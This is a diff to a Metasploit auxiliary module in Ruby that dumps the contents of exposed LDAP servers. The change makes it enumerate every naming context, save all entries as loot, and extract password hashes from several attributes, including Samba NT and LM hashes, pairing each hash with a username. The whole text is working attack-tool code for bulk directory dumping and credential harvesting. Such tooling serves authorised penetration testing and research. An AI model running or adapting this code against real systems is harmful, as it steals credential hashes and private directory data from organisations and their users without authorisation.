@@ -45,17 +45,16 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       Opt::RPORT(636), # SSL/TLS
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
-      OptString.new('USER_ATTR', [false, 'LDAP attribute, that contains username', 'dn']),
-      OptString.new('PASS_ATTR', [true, 'LDAP attribute, that contains password hashes', 'userPassword'])
+      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),
+      OptString.new('PASS_ATTR', [
+        true, 'LDAP attribute, that contains password hashes',
+        'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
+      ])
     ])
   end
 
-  def base_dn
-    @base_dn ||= 'dc=vsp'
-  end
-
   def pass_attr
-    @pass_attr ||= 'userPassword'
+    @pass_attr ||= 'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
   end
 
   def user_attr
@@ -71,43 +70,53 @@ class MetasploitModule < Msf::Auxiliary
   #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \* + -
   def run
     entries = nil
+    base_dn_vuln = nil
 
     ldap_connect do |ldap|
-      if (@base_dn = datastore['BASE_DN'])
+      if (base_dn = datastore['BASE_DN'])
         print_status("User-specified base DN: #{base_dn}")
+        naming_contexts = [base_dn]
       else
-        print_status('Discovering base DN automatically')
+        print_status('Discovering base DN(s) automatically')
 
-        unless (@base_dn = discover_base_dn(ldap))
-          print_warning('Falling back on default base DN dc=vsp')
+        naming_contexts = get_naming_contexts(ldap)
+        if naming_contexts.nil? || naming_contexts.empty?
+          print_warning('Falling back to an empty base DN')
+          naming_contexts = ['']
         end
       end
 
-      print_status("Dumping LDAP data from server at #{peer}")
-
-      entries = ldap.search(base: base_dn)
+      naming_contexts.each do |item|
+        print_status("#{peer} Dumping data for base DN='#{item}'")
+        entries = ldap.search(base: item)
+        # We are ok with any entry returned
+        if entries && entries.any?
+          base_dn_vuln = item
+          pillage(entries, item)
+        else
+          print_error("#{peer} did not return any entries for base DN='#{item}'")
+        end
+      end
     end
 
     # We are ok with any entry returned
-    unless entries && entries.any?
-      print_error("#{peer} LDAP server did not return any entries")
+    unless base_dn_vuln
+      print_error("#{peer} seems to be safe")
       return Exploit::CheckCode::Safe
     end
 
-    pillage(entries)
-
     # HACK: Stash discovered base DN in CheckCode reason
-    Exploit::CheckCode::Vulnerable(base_dn)
+    Exploit::CheckCode::Vulnerable(base_dn_vuln)
   rescue Net::LDAP::Error => e
     print_error("#{e.class}: #{e.message}")
     Exploit::CheckCode::Unknown
   end
 
-  def pillage(entries)
+  def pillage(entries, base_dn)
     # TODO: Make this more efficient?
     ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join("\n")
 
-    print_status('Storing LDAP data in loot')
+    print_status("Storing LDAP data for base DN='#{base_dn}' in loot")
 
     ldif_filename = store_loot(
       name, # ltype
@@ -127,14 +136,16 @@ class MetasploitModule < Msf::Auxiliary
 
     @pass_attr ||= datastore['PASS_ATTR']
 
-    print_status("Searching for attribute: #{@pass_attr}")
+    print_status("Searching for attribute(s): #{@pass_attr}")
     # Process entries with a non-empty userPassword attribute
-    process_hashes(entries.select { |entry| entry[@pass_attr].any? })
+    @pass_attr.split(/[,\s]+/).compact.reject(&:empty?).each do |item|
+      process_hashes(entries.select { |entry| entry[item.strip].any? }, item.strip)
+    end
   end
 
-  def process_hashes(entries)
+  def process_hashes(entries, pass_attr_name)
     if entries.empty?
-      print_status('No password hashes found')
+      print_status("No enties found for the '#{pass_attr_name}' attribute")
       return
     end
 
@@ -152,13 +163,13 @@ class MetasploitModule < Msf::Auxiliary
 
     @user_attr ||= 'dn'
 
-    print_status("Taking #{@user_attr} attribute as username")
+    print_status("Taking '#{@user_attr}' attribute as username, '#{pass_attr_name}' as password")
 
     entries.each do |entry|
       # This is the "username"
       dn = entry[@user_attr].first # .dn
 
-      hash = entry[@pass_attr].first
+      hash = entry[pass_attr_name].first
 
       # Skip empty hashes '{CRYPT}x'
       if hash.nil? || hash.empty? ||
